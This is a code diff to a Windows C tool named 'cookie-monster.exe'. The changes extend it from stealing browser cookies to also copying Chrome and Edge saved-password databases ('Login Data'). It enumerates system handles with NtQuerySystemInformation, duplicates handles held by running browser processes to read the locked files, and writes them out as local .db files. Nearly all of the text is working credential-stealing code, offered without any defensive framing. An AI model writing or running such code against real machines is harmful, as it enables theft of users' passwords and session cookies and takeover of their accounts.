@@ -15,10 +15,13 @@ VOID GetChromeKey();
 VOID GetFirefoxInfo();
 VOID GetEdgeKey();
 CHAR *GetFirefoxFile(CHAR *file, CHAR* profile);
-VOID GetChromeDatabase(DWORD PID);
+BOOL GetChromeDatabase(DWORD PID);
 VOID GetChromePID();
-VOID GetEdgeDatabase(DWORD PID);
+BOOL GetEdgeDatabase(DWORD PID);
 VOID GetEdgePID();
+BOOL GetChromePasswords(DWORD PID);
+BOOL GetEdgePasswords(DWORD PID);
+
 
 CHAR *GetCookieFileContent(CHAR *path) {
     CHAR appdata[MAX_PATH];
@@ -277,6 +280,8 @@ VOID GetChromePID() {
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     PROCESSENTRY32 pe32;
     INT processCount = 0;
+    BOOL databaseStatus = FALSE;
+    BOOL passwordStatus = FALSE;
     pe32.dwSize = sizeof(PROCESSENTRY32);
     //iterate through each handle to find chrome.exe
     if(Process32First(hSnap, &pe32)) {
@@ -285,7 +290,16 @@ VOID GetChromePID() {
             {
                 //chrome was found, get cookies database
                 processCount++;
-                GetChromeDatabase(pe32.th32ProcessID);
+                if (databaseStatus == FALSE){
+                    if (GetChromeDatabase(pe32.th32ProcessID)){
+                        databaseStatus = TRUE;
+                    }
+                }
+                if (passwordStatus == FALSE){
+                    if (GetChromePasswords(pe32.th32ProcessID)){
+                        passwordStatus = TRUE;
+                    }
+                }
             }
         } while(Process32Next(hSnap, &pe32));
     }
@@ -300,7 +314,7 @@ VOID GetChromePID() {
             return;
         }
         //save data to file
-        HANDLE hFile = CreateFile("GoogleCookie.db", GENERIC_ALL,  FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+        HANDLE hFile = CreateFile("ChromeCookie.db", GENERIC_ALL,  FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
         DWORD dwRead = 0;
         WriteFile(hFile, data, strlen(data), &dwRead, NULL);
         CloseHandle(hFile);
@@ -309,10 +323,25 @@ VOID GetChromePID() {
         CHAR cwd[MAX_PATH];
         GetCurrentDirectory(MAX_PATH, cwd);
         printf("Chrome COOKIES saved to %s \n", cwd);
+
+        CHAR *passwordData = GetCookieFileContent("\\Google\\Chrome\\User Data\\Login Data");
+        if(passwordData == NULL) {
+            printf("Chrome LOGIN DATA not found on host\n");
+            return;
+        }
+        //save data to file
+        HANDLE hFile2 = CreateFile("ChromePasswords.db", GENERIC_ALL,  FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+        DWORD dwRead2 = 0;
+        WriteFile(hFile2, passwordData, strlen(passwordData), &dwRead2, NULL);
+        CloseHandle(hFile2);
+        GlobalFree(passwordData);
+        // print current directory to screen
+        GetCurrentDirectory(MAX_PATH, cwd);
+        printf("Chrome LOGIN DATA saved to %s \n", cwd);
     }
 }
 
-VOID GetChromeDatabase(DWORD PID) {
+BOOL GetChromeDatabase(DWORD PID) {
     
     printf("chrome PID found %d\n", PID);
     
@@ -339,14 +368,14 @@ VOID GetChromeDatabase(DWORD PID) {
                         if(hProc == INVALID_HANDLE_VALUE) {
                             printf("OpenProcess failed %d\n", GetLastError());
                             GlobalFree(shi);
-                            return;
+                            return FALSE;
                         }
 
                         HANDLE hDuplicate = NULL;
                         if(!DuplicateHandle(hProc, (HANDLE)shi->Handles[i].Handle, GetCurrentProcess(), &hDuplicate, 0, TRUE, DUPLICATE_SAME_ACCESS)) {
                             printf("DuplicateHandle failed %d\n", GetLastError());
                             GlobalFree(shi);
-                            return;                   
+                            return FALSE;                   
                         }
 
                         FARPROC GetFinalPathNameByHandle = GetProcAddress(LoadLibrary("kernel32.dll"), "GetFinalPathNameByHandleA");
@@ -363,7 +392,7 @@ VOID GetChromeDatabase(DWORD PID) {
                             if(strcmp(newFilename, "Application") == 0) {
                                 printf("SKIPPING PID %d\n", PID);
                                 GlobalFree(shi);
-                                return;
+                                return FALSE;
                             }
                         }
 
@@ -376,12 +405,12 @@ VOID GetChromeDatabase(DWORD PID) {
                             CHAR *buffer = (CHAR*)GlobalAlloc(GPTR, dwFileSize);
                             ReadFile(hDuplicate, buffer, dwFileSize, &dwRead, NULL);
 
-                            HANDLE hFile = CreateFile("GoogleCookie.db", GENERIC_ALL,  FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+                            HANDLE hFile = CreateFile("ChromeCookie.db", GENERIC_ALL,  FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
                             WriteFile(hFile, buffer, dwFileSize, &dwRead, NULL);
                             CloseHandle(hFile);
 
                             GlobalFree(buffer);
-                            ExitProcess(0);
+                            return TRUE;
                         }
 
                         CloseHandle(hDuplicate);
@@ -390,14 +419,98 @@ VOID GetChromeDatabase(DWORD PID) {
         }
     }
     printf("NO HANDLE TO COOKIE WAS FOUND \n");
-    return;
+    return FALSE;
 }
+
+BOOL GetChromePasswords(DWORD PID) {
+    
+    printf("chrome PID found %d\n", PID);
+    
+    SYSTEM_HANDLE_INFORMATION *shi = NULL;
+    DWORD dwNeeded = 0;
+    DWORD dwSize = 0xffffff / 2;
+    shi = (SYSTEM_HANDLE_INFORMATION *)GlobalAlloc(GPTR, dwSize);
+    //utilize NtQueryStemInformation to list all handles on system
+    NTSTATUS status = NtQuerySystemInformation(SystemHandleInformation, shi, dwSize,  &dwNeeded);
+
+    printf("Handle Count %d\n", shi->NumberOfHandles);
+    DWORD i = 0;
+    BOOL firstHandle = TRUE;
+    //iterate through each handle and find our PID and a handle to a file
+    for(i = 0; i < shi->NumberOfHandles; i++) {
+        //check if handle to file
+        if(shi->Handles[i].ObjectTypeNumber == HANDLE_TYPE_FILE) {
+            //check if handle is to our PID
+            if(shi->Handles[i].ProcessId == PID) {
+                
+                printf("PID %d Flags %08x GrantAccess %08x object %p handle is %p\n", PID, shi->Handles[i].Flags, shi->Handles[i].GrantedAccess, shi->Handles[i].Object, (HANDLE)shi->Handles[i].Handle);
+                if(shi->Handles[i].GrantedAccess != 0x001a019f || (shi->Handles[i].Flags != 0x2 && shi->Handles[i].GrantedAccess == 0x0012019f)) {
+                        HANDLE hProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, PID);
+                        if(hProc == INVALID_HANDLE_VALUE) {
+                            printf("OpenProcess failed %d\n", GetLastError());
+                            GlobalFree(shi);
+                            return FALSE;
+                        }
+
+                        HANDLE hDuplicate = NULL;
+                        if(!DuplicateHandle(hProc, (HANDLE)shi->Handles[i].Handle, GetCurrentProcess(), &hDuplicate, 0, TRUE, DUPLICATE_SAME_ACCESS)) {
+                            printf("DuplicateHandle failed %d\n", GetLastError());
+                            GlobalFree(shi);
+                            return FALSE;                   
+                        }
+
+                        FARPROC GetFinalPathNameByHandle = GetProcAddress(LoadLibrary("kernel32.dll"), "GetFinalPathNameByHandleA");
+                        CHAR filename[256];
+                        ZeroMemory(filename, 256);
+                        GetFinalPathNameByHandle(hDuplicate, filename, 256, FILE_NAME_NORMALIZED);
+                        printf("%s\n", filename);
+
+                        if(firstHandle) {
+                            DWORD dwFilenameSize = strlen(filename);
+                            CHAR *newFilename = filename + strlen(filename) - strlen("Application");
+                            firstHandle = FALSE;
+
+                            if(strcmp(newFilename, "Application") == 0) {
+                                printf("SKIPPING PID %d\n", PID);
+                                GlobalFree(shi);
+                                return FALSE;
+                            }
+                        }
+
+                        if(strstr(filename, "Login Data") != NULL) {
+                            printf("Login Data WAS FOUND\n");
+                            SetFilePointer(hDuplicate, 0, 0, FILE_BEGIN);
+                            DWORD dwFileSize = GetFileSize(hDuplicate, NULL);
+                            printf("file size is %d\n", dwFileSize);
+                            DWORD dwRead = 0;
+                            CHAR *buffer = (CHAR*)GlobalAlloc(GPTR, dwFileSize);
+                            ReadFile(hDuplicate, buffer, dwFileSize, &dwRead, NULL);
+
+                            HANDLE hFile = CreateFile("ChromePasswords.db", GENERIC_ALL,  FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+                            WriteFile(hFile, buffer, dwFileSize, &dwRead, NULL);
+                            CloseHandle(hFile);
+
+                            GlobalFree(buffer);
+                            return TRUE;
+                        }
+
+                        CloseHandle(hDuplicate);
+                }
+            }
+        }
+    }
+    printf("NO HANDLE TO LOGIN DATA WAS FOUND \n");
+    return FALSE;
+}
+
 
 VOID GetEdgePID() {
     //get handle to all processes
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     PROCESSENTRY32 pe32;
     INT processCount = 0;
+    BOOL databaseStatus = FALSE;
+    BOOL passwordStatus = FALSE;
     pe32.dwSize = sizeof(PROCESSENTRY32);
     //iterate through each handle to find chrome.exe
     if(Process32First(hSnap, &pe32)) {
@@ -406,7 +519,16 @@ VOID GetEdgePID() {
             {
                 //edge was found, get cookies database
                 processCount++;
-                GetEdgeDatabase(pe32.th32ProcessID);
+                if (databaseStatus == FALSE){
+                    if (GetEdgeDatabase(pe32.th32ProcessID)){
+                        databaseStatus = TRUE;
+                    }
+                }
+                if (passwordStatus == FALSE){
+                    if (GetEdgePasswords(pe32.th32ProcessID)){
+                        passwordStatus = TRUE;
+                    }
+                }
             }
         } while(Process32Next(hSnap, &pe32));
     }
@@ -430,10 +552,26 @@ VOID GetEdgePID() {
         CHAR cwd[MAX_PATH];
         GetCurrentDirectory(MAX_PATH, cwd);
         printf("Edge COOKIES saved to %s \n", cwd);
+
+        
+        CHAR *passwordData = GetCookieFileContent("\\Microsoft\\Edge\\User Data\\Default\\Login Data");
+        if(passwordData == NULL) {
+            printf("Edge LOGIN DATA not found on host\n");
+            return;
+        }
+        //save data to file
+        HANDLE hFile2 = CreateFile("EdgePasswords.db", GENERIC_ALL,  FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+        DWORD dwRead2 = 0;
+        WriteFile(hFile2, passwordData, strlen(passwordData), &dwRead2, NULL);
+        CloseHandle(hFile2);
+        GlobalFree(passwordData);
+        // print current directory to screen
+        GetCurrentDirectory(MAX_PATH, cwd);
+        printf("Edge LOGIN DATA saved to %s \n", cwd);
     }
 }
 
-VOID GetEdgeDatabase(DWORD PID) {
+BOOL GetEdgeDatabase(DWORD PID) {
     
     printf("Edge PID found %d\n", PID);
     
@@ -484,7 +622,7 @@ VOID GetEdgeDatabase(DWORD PID) {
                         if(hProc == INVALID_HANDLE_VALUE) {
                             printf("OpenProcess failed %d\n", GetLastError());
                             GlobalFree(shi);
-                            return;
+                            return FALSE;
                         }
                         //get last error
                         //DWORD dwError = NULL;
@@ -495,9 +633,116 @@ VOID GetEdgeDatabase(DWORD PID) {
                         if(!DuplicateHandle(hProc, (HANDLE)shi->Handles[i].Handle, GetCurrentProcess(), &hDuplicate, 0, TRUE, DUPLICATE_SAME_ACCESS)) {
                             printf("DuplicateHandle failed %d\n", GetLastError());
                             GlobalFree(shi);
-                            return;                   
+                            return FALSE;                   
                         }
                         //get last error
+                        DWORD dwError2 = NULL;
+                        dwError2 = GetLastError();
+                        printf("Last Error: %d\n", dwError2);
+                        //when file does not exist on disk, error 87 thrown
+                        if(dwError2 == 87) {
+                            SetLastError(0);
+                            printf("Wrong Function Call Somewhere \n");
+                            //GlobalFree(shi);
+                            continue;
+                        }
+
+                        FARPROC GetFinalPathNameByHandle = GetProcAddress(LoadLibrary("kernel32.dll"), "GetFinalPathNameByHandleA");
+                        CHAR filename[256];
+                        ZeroMemory(filename, 256);
+                        GetFinalPathNameByHandle(hDuplicate, filename, 256, FILE_NAME_NORMALIZED);
+                        
+                        printf("%s\n", filename);
+                        printf("Length of file name is %d\n", strlen(filename));
+                        
+                        if(firstHandle) {
+                            DWORD dwFilenameSize = strlen(filename);
+                            CHAR *newFilename = filename + strlen(filename) - strlen("Application");
+                            firstHandle = FALSE;
+
+                            if(strcmp(newFilename, "Application") == 0) {
+                                printf("SKIPPING PID %d\n", PID);
+                                GlobalFree(shi);
+                                return FALSE;
+                            }
+                        }
+
+                        if(strstr(filename, "Cookies") != NULL) {
+                            printf("COOKIE WAS FOUND\n");
+                            SetFilePointer(hDuplicate, 0, 0, FILE_BEGIN);
+                            DWORD dwFileSize = GetFileSize(hDuplicate, NULL);
+                            printf("file size is %d\n", dwFileSize);
+                            DWORD dwRead = 0;
+                            CHAR *buffer = (CHAR*)GlobalAlloc(GPTR, dwFileSize);
+                            ReadFile(hDuplicate, buffer, dwFileSize, &dwRead, NULL);
+
+                            HANDLE hFile = CreateFile("EdgeCookie.db", GENERIC_ALL,  FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+                            WriteFile(hFile, buffer, dwFileSize, &dwRead, NULL);
+                            CloseHandle(hFile);
+
+                            GlobalFree(buffer);
+                            return TRUE;
+                        }
+
+                        CloseHandle(hDuplicate);
+                }
+            }
+        }
+    }
+    printf("NO HANDLE TO COOKIE WAS FOUND \n");
+    return FALSE;
+}
+
+BOOL GetEdgePasswords(DWORD PID) {
+    
+    printf("Edge PID found %d\n", PID);
+    
+    //SYSTEM_HANDLE_INFORMATION *shi = NULL;
+    DWORD dwNeeded = 0;
+    NTSTATUS status;
+    DWORD dwSize = 0xffffff / 2;
+    //shi = (SYSTEM_HANDLE_INFORMATION *)GlobalAlloc(GPTR, dwSize);
+    //utilize NtQueryStemInformation to list all handles on system
+    PSYSTEM_HANDLE_INFORMATION shi;
+    ULONG handleInfoSize = 0x10000;
+    shi = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
+
+    while ((status = NtQuerySystemInformation(
+        SystemHandleInformation,
+        shi,
+        handleInfoSize,
+        NULL
+        )) == STATUS_INFO_LENGTH_MISMATCH)
+        shi = (PSYSTEM_HANDLE_INFORMATION)realloc(shi, handleInfoSize *= 2);
+
+    //NTSTATUS status = NtQuerySystemInformation(SystemHandleInformation, shi, dwSize,  &dwNeeded);
+
+    printf("Handle Count %d\n", shi->NumberOfHandles);
+    DWORD i = 0;
+    BOOL firstHandle = TRUE;
+    //iterate through each handle and find our PID and a handle to a file
+    for(i = 0; i < shi->NumberOfHandles; i++) {
+        //check if handle to file
+        if(shi->Handles[i].ObjectTypeNumber == HANDLE_TYPE_FILE) {
+            //check if handle is to our PID
+            if(shi->Handles[i].ProcessId == PID) {
+                printf("PID %d Flags %08x GrantAccess %08x object %p handle is %p\n", PID, shi->Handles[i].Flags, shi->Handles[i].GrantedAccess, shi->Handles[i].Object, (HANDLE)shi->Handles[i].Handle);
+                
+                if( (shi->Handles[i].GrantedAccess != 0x001a019f || (shi->Handles[i].Flags != 0x00000002 && shi->Handles[i].GrantedAccess == 0x0012019f))) {
+                        HANDLE hProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, PID);
+                        if(hProc == INVALID_HANDLE_VALUE) {
+                            printf("OpenProcess failed %d\n", GetLastError());
+                            GlobalFree(shi);
+                            return FALSE;
+                        }
+
+                        HANDLE hDuplicate = NULL;
+                        if(!DuplicateHandle(hProc, (HANDLE)shi->Handles[i].Handle, GetCurrentProcess(), &hDuplicate, 0, TRUE, DUPLICATE_SAME_ACCESS)) {
+                            printf("DuplicateHandle failed %d\n", GetLastError());
+                            GlobalFree(shi);
+                            return FALSE;                   
+                        }
+                        //when file does not exist on disk, error 87 thrown
                         DWORD dwError2 = NULL;
                         dwError2 = GetLastError();
                         printf("Last Error: %d\n", dwError2);
@@ -525,12 +770,12 @@ VOID GetEdgeDatabase(DWORD PID) {
                             if(strcmp(newFilename, "Application") == 0) {
                                 printf("SKIPPING PID %d\n", PID);
                                 GlobalFree(shi);
-                                return;
+                                return FALSE;
                             }
                         }
 
-                        if(strstr(filename, "Cookies") != NULL) {
-                            printf("COOKIE WAS FOUND\n");
+                        if(strstr(filename, "Login Data") != NULL) {
+                            printf("LOGIN DATA WAS FOUND\n");
                             SetFilePointer(hDuplicate, 0, 0, FILE_BEGIN);
                             DWORD dwFileSize = GetFileSize(hDuplicate, NULL);
                             printf("file size is %d\n", dwFileSize);
@@ -538,12 +783,12 @@ VOID GetEdgeDatabase(DWORD PID) {
                             CHAR *buffer = (CHAR*)GlobalAlloc(GPTR, dwFileSize);
                             ReadFile(hDuplicate, buffer, dwFileSize, &dwRead, NULL);
 
-                            HANDLE hFile = CreateFile("EdgeCookie.db", GENERIC_ALL,  FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+                            HANDLE hFile = CreateFile("EdgePasswords.db", GENERIC_ALL,  FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
                             WriteFile(hFile, buffer, dwFileSize, &dwRead, NULL);
                             CloseHandle(hFile);
 
                             GlobalFree(buffer);
-                            ExitProcess(0);
+                            return TRUE;
                         }
 
                         CloseHandle(hDuplicate);
@@ -551,8 +796,8 @@ VOID GetEdgeDatabase(DWORD PID) {
             }
         }
     }
-    printf("NO HANDLE TO COOKIE WAS FOUND \n");
-    return;
+    printf("NO HANDLE TO LOGIN DATA WAS FOUND \n");
+    return FALSE;
 }
 
 
@@ -564,10 +809,10 @@ int main(int argc, char* argv[]) {
         printf("  cookie-monster.exe --all \n");
         printf("Cookie Monster Options:\n");
         printf("  -h, --help\t\t\t Show this help message and exit\n");
-        printf("  --all\t\t\t\t Run chrome, edge, and firefox methods\n");
-        printf("  --edge\t\t\t Extract edge key and download cookies file to PWD\n");
-        printf("  --chrome\t\t\t Extract chrome key and download cookies file to PWD\n");
-        printf("  --firefox\t\t\t Locate firefox key and Cookies, does not make a copy of either file\n");
+        printf("  --all\t\t\t\t Extract chrome, edge, and firefox keys\n");
+        printf("  --edge\t\t\t Extract edge keys\n");
+        printf("  --chrome\t\t\t Extract chrome keys\n");
+        printf("  --firefox\t\t\t Extract firefox keys\n");
         return 0;
     }
     if(strcmp(argv[1], "--all") == 0){
